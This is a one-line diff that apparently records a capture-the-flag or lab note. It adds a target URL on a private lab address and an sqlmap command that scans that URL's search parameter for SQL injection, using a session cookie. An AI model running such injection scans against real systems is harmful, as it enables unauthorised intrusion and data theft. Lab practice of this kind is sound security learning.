@@ -1,0 +1,1 @@
+http://10.10.10.46/dashboard.php?search=tes (GET)  # /usr/bin/sqlmap -u http://10.10.10.46/dashboard.php?search=tes --cookie PHPSESSID=073ggj0s9c3154k9og0l6p2osg
